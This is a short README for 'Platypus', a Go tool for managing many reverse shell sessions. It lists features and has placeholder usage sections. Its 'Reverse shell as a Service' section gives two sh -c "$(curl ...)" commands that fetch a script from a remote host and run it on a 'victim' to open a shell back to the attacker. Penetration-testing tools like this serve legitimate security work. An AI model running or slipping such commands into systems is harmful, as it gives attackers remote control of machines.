# Platypus

A modern multiple reverse shell sessions/clients manager via terminal written in go

#### Features
- [x] Multiple service listening port
- [x] Multiple client connections
- [x] RESTful API
- [x] Reverse shell as a service
- [ ] Upgrade common reverse shell session into full interactive session

#### Usage
```
# TODO
```

#### Example
```
# TODO
```

#### Reverse shell as a Service
```
# victim will be redirected to attacker-host attacker-port
sh -c "$(curl http://host:port/attacker-host/attacker-port)"
# if the attacker info not specified, it will use host, port as attacker-host attacker-port
sh -c "$(curl http://host:port/)"
```

#### TODO
- [ ] More interface in RESTful API
